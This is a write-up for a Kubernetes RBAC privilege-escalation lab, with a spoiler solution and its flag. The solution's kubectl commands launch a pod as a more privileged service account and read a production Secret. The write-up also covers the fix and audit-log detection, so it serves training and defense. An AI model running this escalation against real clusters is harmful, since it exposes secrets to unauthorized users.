# create-pods - escalation by running a pod as a stronger identity (RBAC)

An RBAC privilege-escalation lab in the nested-cluster shape. The student lands
in a `dev`-namespace shell whose service account can only `create` pods in the
`ops` namespace, and must read a Secret in `production` by launching a pod that
runs as a more privileged account.

## Shape

Everything is in the module's manifest bundle
(`services/backend/internal/labs/modules/create-pods.yaml`), applied into the
session's disposable nested k3s cluster. The foothold uses the shared
`k8labs-foothold` image; the pod the student *creates* reuses that same baked
image (no per-module image). The flag is bait, not a secret (see `_template`).

## The flaw

The foothold's service account (`dev/deployer`) holds `create` on pods (plus
`get` on `pods` and `pods/log`) in `ops`. Plain RBAC does not gate which
`serviceAccountName` a pod creator may set, so the foothold can launch a pod that
runs as `ops/builder` - an account legitimately bound to read secrets in
`production`. The pod boots with builder's mounted token; a command inside it
reads the flag and prints it, and the foothold reads the pod's logs.

## Airgap detail

The nested cluster pulls no images. The pod the student creates must use an image
already present - `k8labs-foothold:1.31` with `imagePullPolicy: Never` - or it
sits in `ImagePullBackOff`. This is the lab's distinctive teaching point and is
covered in the course.

## Solution (spoiler)

```sh
kubectl auth can-i --list -n ops                 # spot: create pods + pods/log in ops (bare --list checks dev, shows nothing)
kubectl get serviceaccounts -n ops               # find: builder
kubectl run pwn -n ops --restart=Never --image=k8labs-foothold:1.31 \
  --image-pull-policy=Never \
  --overrides='{"spec":{"serviceAccountName":"builder"}}' \
  --command -- sh -c 'kubectl get secret flag -n production -o jsonpath="{.data.flag}" | base64 -d'
kubectl logs pwn -n ops
# k8labs{create_pods_runs_your_code_as_any_service_account}
```

## The fix

Grant pod creation narrowly, and add admission control (a policy engine, or a
restricted PodSecurity path) that limits which `serviceAccountName` a creator may
set. Treat every workload-creating verb (pods, deployments, jobs, cronjobs) as
"run code as the accounts in this namespace".

## What a defender sees

The API server audit log records a `create` on `pods` in `ops` whose spec names a
`serviceAccountName` the creator does not own, followed by that pod's token
reading a production Secret. Under Kata in prod, host-level Tetragon cannot see
inside the nested cluster, so this is an audit-log / in-cluster-telemetry
observation - the same design note as `ns-escape`.
